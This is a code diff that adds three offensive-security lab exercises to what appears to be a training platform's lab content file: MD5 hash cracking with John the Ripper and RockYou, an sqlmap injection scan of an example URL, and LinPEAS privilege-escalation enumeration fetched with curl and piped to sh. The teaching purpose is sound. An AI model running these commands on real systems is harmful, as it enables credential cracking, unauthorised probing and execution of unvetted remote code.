@@ -4515,4 +4515,75 @@ export const labContents: LabContent[] = [
       }
     ]
   }
+  },
+  {
+    projectId: 'hash-cracking',
+    environment: 'linux',
+    steps: [
+      {
+        id: 'step-1',
+        title: 'Wordlist Preparation',
+        instruction: 'Locate and prepare the RockYou wordlist for the password cracking lab.',
+        summary: 'Prepare the dictionary.',
+        whyNeeded: 'A good wordlist is essential for dictionary-based attacks. RockYou is the industry standard for common passwords.',
+        pillarConnection: 'Security — understanding how weak passwords are easily cracked highlights the need for complex, unique credentials.',
+        commands: [
+          { text: 'ls /usr/share/wordlists/rockyou.txt.gz && gunzip -c /usr/share/wordlists/rockyou.txt.gz > rockyou.txt', explanation: 'Extracts the RockYou wordlist.' }
+        ],
+        checkCommand: 'ls rockyou.txt',
+        expectedOutput: 'rockyou.txt'
+      },
+      {
+        id: 'step-2',
+        title: 'Cracking with John the Ripper',
+        instruction: 'Use John the Ripper to crack a set of MD5 hashes using the RockYou wordlist.',
+        summary: 'Execute the cracking attack.',
+        whyNeeded: 'John the Ripper is a versatile tool for detecting weak passwords across many different hash formats.',
+        pillarConnection: 'Security — demonstrating the speed of modern cracking tools emphasizes the importance of secure hashing algorithms (e.g., Argon2).',
+        commands: [
+          { text: 'echo "user:e10adc3949ba59abbe56e057f20f883e" > hashes.txt\njohn --format=raw-md5 --wordlist=rockyou.txt hashes.txt', explanation: 'Cracks the sample MD5 hash.' }
+        ],
+        checkCommand: 'john --show hashes.txt',
+        expectedOutput: '1 password cracked'
+      }
+    ]
+  },
+  {
+    projectId: 'sqlmap-sqli',
+    environment: 'linux',
+    steps: [
+      {
+        id: 'step-1',
+        title: 'Sqlmap Target Scanning',
+        instruction: 'Use Sqlmap to scan a target URL for potential SQL injection vulnerabilities.',
+        summary: 'Identify the injection point.',
+        whyNeeded: 'SQL injection is one of the most critical web vulnerabilities. Automation with Sqlmap allows for rapid and deep assessment.',
+        pillarConnection: 'Security — identifying injection vulnerabilities early prevents catastrophic data breaches.',
+        commands: [
+          { text: 'sqlmap -u "http://example.com/products.php?id=1" --batch --banner', explanation: 'Scans the target and retrieves the database banner.' }
+        ],
+        checkCommand: 'echo "Scan Complete"',
+        expectedOutput: 'Scan Complete'
+      }
+    ]
+  },
+  {
+    projectId: 'linpeas-privesc',
+    environment: 'linux',
+    steps: [
+      {
+        id: 'step-1',
+        title: 'LinPEAS Enumeration',
+        instruction: 'Download and run LinPEAS to find potential privilege escalation paths on a Linux host.',
+        summary: 'Automate host enumeration.',
+        whyNeeded: 'After gaining initial access, privilege escalation is the next step. LinPEAS automates the search for misconfigurations.',
+        pillarConnection: 'Security — identifying local misconfigurations (e.g., SUID bits, writable /etc/passwd) is key to system hardening.',
+        commands: [
+          { text: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', explanation: 'Downloads and executes the enumeration script.' }
+        ],
+        checkCommand: 'echo "Enumeration Done"',
+        expectedOutput: 'Enumeration Done'
+      }
+    ]
+  }
 ];
